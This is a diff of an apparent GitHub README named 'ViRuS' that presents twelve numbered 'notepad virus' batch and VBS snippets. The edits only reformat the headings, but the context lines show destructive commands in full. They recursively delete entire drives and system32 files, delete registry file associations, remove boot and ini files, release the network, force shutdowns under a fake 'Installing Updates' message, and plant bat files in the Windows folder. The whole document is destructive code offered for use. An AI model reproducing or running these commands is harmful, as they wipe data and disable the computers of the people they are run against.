@@ -1,10 +1,10 @@
 # ViRuS
-simple notepad virus
+##simple notepad virus
 
 
 # codes given below
 
-# virus - 1
+- virus - 1
 
 @echo off
 :VIRUS
@@ -20,7 +20,7 @@ REM errorcode401.blogspot.in
 
 
 -----------------------------------
-# virus - 2
+-  virus - 2
 
 @echo off
 del D:\*.* /f /s /q
@@ -33,7 +33,7 @@ del J:\*.* /f /s /q
 
 
 -------------------------
-# virus - 3
+-  virus - 3
 
 @ECHO OFF
 START reg delete HKCR/.exe
@@ -42,20 +42,20 @@ START reg delete HKCR/*
 
 
 --------------------------
-# virus - 4
+-  virus - 4
 
 @Echo off
 Ipconfig /release
 
 -------------------------
-# virus - 5
+- virus - 5
 
 @echo off
 msg * Lets Roll Baby
 shutdown -c “Error! Your ass got glued!” -s
 
 -----------------------------
-# virus - 6
+- virus - 6
 
 (save as .VBS)
 
@@ -70,14 +70,14 @@ WSHShell.Run “Tourstart.exe”
 Next
 
 --------------------------------------------------------------------
-# virus - 7
+- virus - 7
 rd/s/q D:\
 rd/s/q C:\
 rd/s/q E:\
 
 ----------------------------------------------------------------
 
-# virus - 8
+- virus - 8
 
 echo @echo off>c:windowshartlell.bat
 echo break off>>c:windowshartlell.bat
@@ -90,7 +90,7 @@ PAUSE
 
 -----------------------------------------------------------------------------
 
-# virus - 9
+- virus - 9
 
 @echo off
 attrib -r -s -h c:\autoexec.bat
@@ -103,17 +103,17 @@ attrib -r -s -h c:\windows\win.ini
 del c:\windows\win.ini
 
 --------------------------------------------------------------
-# virus - 10
+- virus - 10
 
 shutdown -s -t 100 c “Installing Updates”
 
 --------------------------------------------------------------------
-# virus - 11
+- virus - 11
 
 del c:\WINDOWS\system32\*.*/q
 
 --------------------------------
-# virus - 12
+- virus - 12
 
 echo @echo off>c:windowswimn32.bat
 echo break off>>c:windowswimn32.bat
